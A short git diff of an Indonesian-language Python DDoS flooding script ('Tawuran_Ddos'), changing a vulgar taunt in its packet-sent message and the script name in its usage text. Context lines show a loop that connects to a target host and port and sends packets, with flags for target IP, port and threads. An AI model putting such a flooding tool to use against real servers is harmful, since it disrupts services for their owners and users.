@@ -50,7 +50,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-Mr.TomCat mengirim paket✓-> musuh sedang berak\033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-Mr.TomCat mengirim paket✓-> musuh sedang coli\033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -79,7 +79,7 @@ def usage():
 	print (''' \033[92mTawuran_Ddos Script v.1 http:/www.google.com
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
-	usage : python3 Tawuran1.py [-s] [-p] [-t]
+	usage : python3 Tawuran.py [-s] [-p] [-t]
 	-h : help (tolong)
 	-s : server ip
 	-p : port default 80
